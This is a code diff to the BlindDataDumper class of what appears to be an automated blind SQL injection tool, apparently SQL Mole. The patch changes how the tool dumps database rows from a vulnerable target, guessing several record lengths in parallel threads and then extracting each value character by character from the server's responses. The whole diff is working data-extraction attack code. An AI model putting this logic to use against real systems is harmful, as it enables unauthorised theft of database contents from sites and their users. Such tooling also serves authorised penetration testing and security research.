@@ -97,30 +97,34 @@ class BlindDataDumper:
             count = min(count, limit+start)
             print('\r[+] Found row count:', count)
         results = []
-        for row in range(start, count):
+        row = start
+        while row < count:
             if mole.stop_query:
                 return results
-            length = self._generic_blind_len(
-                mole,
-                length_fun(row),
-                lambda x: '\rTrying length: ' + str(x),
-                lambda x: '\rAt most length: ' + str(x)
-            )
-            print('\r[+] Guessed length:', length)
-            output=''
-            if mole.stop_query:
-                return results
-            sqli_output = BlindSQLIOutput(length)
-            gen_query_item = lambda i: self._blind_query_character(mole, query_fun, i, row, sqli_output)
-            output = ''.join(mole.threader.execute(length, gen_query_item))
-            if not mole.stop_query:
-                sqli_output.finish()
+            len_funct = lambda i: self._generic_blind_len(mole, length_fun(row + i), None, None, print_stats = False)
+            to_fetch = min(count - row, len(mole.threader.threads))
+            if to_fetch > 1:
+                print('[+] Guessing length for the next', to_fetch, 'records.')
             else:
-                print('')
-            results.append(output.split(mole._dbms_mole.blind_field_delimiter()))
+                print('[+] Guessing length for the next record.')
+            lengths = mole.threader.execute(to_fetch, len_funct)
+            for length in lengths:
+                print('\r[+] Guessed length:', length)
+                output=''
+                if mole.stop_query:
+                    return results
+                sqli_output = BlindSQLIOutput(length)
+                gen_query_item = lambda i: self._blind_query_character(mole, query_fun, i, row, sqli_output)
+                output = ''.join(mole.threader.execute(length, gen_query_item))
+                if not mole.stop_query:
+                    sqli_output.finish()
+                else:
+                    print('')
+                results.append(output.split(mole._dbms_mole.blind_field_delimiter()))
+                row += 1
         return results
 
-    def _generic_blind_len(self, mole, count_fun, trying_msg, max_msg):
+    def _generic_blind_len(self, mole, count_fun, trying_msg, max_msg, print_stats = True):
         length = 0
         last = 1
         while True and not mole.stop_query:
@@ -128,11 +132,13 @@ class BlindDataDumper:
                 req = mole.make_request(count_fun('>', last))
             except ConnectionException as ex:
                 raise QueryError('Connection Error: (' + str(ex) + ')')
-            print(trying_msg(last), end='')
+            if print_stats:
+                print(trying_msg(last), end='')
             if mole.needle in req:
                 break;
             last *= 2
-        print(max_msg(str(last)), end='')
+        if print_stats:
+            print(max_msg(str(last)), end='')
         pri = last // 2
         while pri < last:
             if mole.stop_query:
